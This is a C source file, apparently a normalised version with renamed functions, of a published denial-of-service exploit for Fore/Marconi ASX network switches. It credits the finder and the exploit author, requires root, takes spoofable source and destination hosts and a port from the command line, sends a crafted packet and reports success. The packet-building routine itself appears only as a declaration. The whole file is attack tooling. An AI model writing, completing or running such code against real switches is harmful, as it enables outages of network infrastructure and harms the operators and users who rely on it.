#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 unsigned short FUNC0 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC1 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC2 (unsigned int,unsigned int,unsigned short) ; 
 int FUNC3 (int,char**,char*) ; 
 scalar_t__ FUNC4 () ; 
 unsigned int FUNC5 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  optarg ; 
 int /*<<< orphan*/  FUNC6 (char*) ; 
 int /*<<< orphan*/  FUNC7 (char*,int /*<<< orphan*/ ,int) ; 
 int /*<<< orphan*/  FUNC8 (char*) ; 

FUNC9 (int argc, char **argv)
{
	unsigned int        source_host = 0, dest_host = 0;
	unsigned short      source_port = 0, dest_port = 80;
	int                 input;
	char                desthost[16], srchost[16];

	FUNC6 ("\nDenial of Service attack for Fore/Marconi ASX Switches\n");
	FUNC6
		("Found by Keith Pachulski <keithp@corp.ptd.net>\nExploit written by J.K. Garvey <jim@trig.org>\n");

	if (FUNC4 () != 0)
	{
		FUNC6
			("\nRoot is required. Duh.\n");
		FUNC1 (0);
	}

	if (argc < 5)
	{
		FUNC8 (argv[0]);
		FUNC1 (0);
	}

        while ((input = FUNC3 (argc, argv, "s:d:p:")) != -1)
	{
		switch (input)
		{
			case 's':
				source_host = FUNC5 (optarg);
				FUNC7 (srchost, optarg, 16);
			break;

			case 'd':
				dest_host = FUNC5 (optarg);
				FUNC7 (desthost, optarg, 16);
			break;

			case 'p':
				dest_port = FUNC0(optarg);
			break;
		}
	}

	FUNC2 (source_host, dest_host, dest_port); 
	FUNC6 ("\nCrafted packet sent!\n");

	FUNC1 (0);
}